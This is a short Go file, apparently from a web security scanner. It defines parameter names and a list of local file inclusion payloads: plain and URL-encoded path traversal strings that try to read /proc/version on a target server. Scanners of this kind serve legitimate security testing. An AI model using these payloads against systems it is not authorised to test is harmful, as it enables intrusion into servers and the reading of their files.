package payloads

// For lfiAttack Function

var LFIKnownCommonPayloads = []string{
	"page",
	"download",
	"document",
}

var LFIPayloads = []string{
	"../../../../../../proc/version", 
	"..//..//..//..//..//..//..//proc/version", 
	"..%2f..%2f..%2f..%2f..%2f..%2f..%2f/proc/version", 
	"%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//proc/version",
}
